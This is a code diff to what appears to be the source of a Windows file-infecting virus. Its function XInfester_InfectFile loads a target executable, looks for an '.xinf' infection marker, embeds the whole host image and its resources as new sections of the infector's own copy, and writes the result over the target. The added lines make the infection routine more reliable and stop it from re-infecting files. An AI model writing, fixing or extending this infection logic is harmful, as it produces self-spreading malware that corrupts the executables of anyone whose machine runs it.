@@ -86,9 +86,15 @@ BOOL XInfester_InfectFile( const char *pDestFileName )
 	{
 		goto _ERR;
 	}
+
+	if(!__Dest.GetImageRootResourceDirectoryPointer())
+	{
+		goto _ERR;
+	}
+
 	for (int i=0;i<__Dest.GetSectionCount();i++)
 	{
-		if (strcmp(__Dest.GetSectionName(i),XINFESTED_SECTION_STRING)==0)
+		if (strcmp(__Dest.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
 		{
 			__Dest.free();
 			return TRUE;
@@ -99,14 +105,32 @@ BOOL XInfester_InfectFile( const char *pDestFileName )
 	if(!__Final.Load_PE_File(GetLocalAppFilename()))
 		goto _ERR;
 
+
+	for (int i=0;i<__Final.GetSectionCount();i++)
+	{
+		if (strcmp(__Final.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
+		{
+			//remove ".xinf" & resource section
+			if(__Final.RemoveLastSection()&&
+			__Final.RemoveLastSection())
+			{
+				break;
+			}
+			else
+			{
+				goto _ERR;
+			}
+		}
+	}
+
 	
 	//Copy destPE resource section
 	DWORD newResourceRVA;
 
 	if(!__Final.AddSection
 		(
-		__Final.GetSectionCharacter(__Final.GetResourceDirctorySectionIndex()),
-		(char *)__Final.GetSectionName(__Final.GetResourceDirctorySectionIndex()),
+		__Dest.GetSectionCharacter(__Dest.GetResourceDirctorySectionIndex()),
+		(char *)__Dest.GetSectionName(__Dest.GetResourceDirctorySectionIndex()),
 		__Dest.GetDirectorySize(2),
 		newResourceRVA,
 		__Dest.GetDirectoryDataBufferPointer(2)
@@ -120,8 +144,8 @@ BOOL XInfester_InfectFile( const char *pDestFileName )
 	//Copy host file to section
 	if (!__Final.AddSection
 		(
-		__Final.GetSectionCharacter(__Final.GetResourceDirctorySectionIndex()),
-		XINFESTED_SECTION_STRING,
+		__Dest.GetSectionCharacter(__Dest.GetResourceDirctorySectionIndex()),
+		XINFESTED_SOURCE_SECTION_STRING,
 		__Dest.GetImageSize(),
 		HostRVA,
 		__Dest.ImagePointer(0)
@@ -138,8 +162,11 @@ BOOL XInfester_InfectFile( const char *pDestFileName )
 	//
 	vTemp_NewResRVAOffset=HostRVA;
 	vTemp_DestPE=&__Dest;
-	__Final.EnumImageResourceData(__Final.GetImageRootResourceDirectoryPointer(),ResourcesFixer);
 
+	if(__Final.GetImageRootResourceDirectoryPointer())
+	__Final.EnumImageResourceData(__Final.GetImageRootResourceDirectoryPointer(),ResourcesFixer);
+	else
+	goto _ERR;
 
 	if(!__Final.Dump(pDestFileName))
 		goto _ERR;
@@ -164,6 +191,8 @@ void XInfester_Run()
 	{
 		return;
 	}
+
+
 
 	for (int i=0;i<_SelfPE.GetSectionCount();i++)
 	{
